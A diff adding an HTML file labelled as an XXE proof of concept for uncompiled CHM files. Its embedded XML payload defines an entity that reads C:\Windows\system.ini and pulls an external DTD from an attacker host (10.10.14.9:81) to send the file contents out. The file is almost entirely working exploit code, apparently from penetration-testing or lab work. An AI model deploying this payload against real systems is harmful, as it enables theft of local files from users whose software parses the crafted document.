@@ -1,0 +1,16 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<Title>Uncompiled CHM File XXE PoC</Title>
+</HEAD>
+<BODY>
+<xml>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE tastyexploits [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://10.10.14.9:81/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+</BODY>
+</HTML>
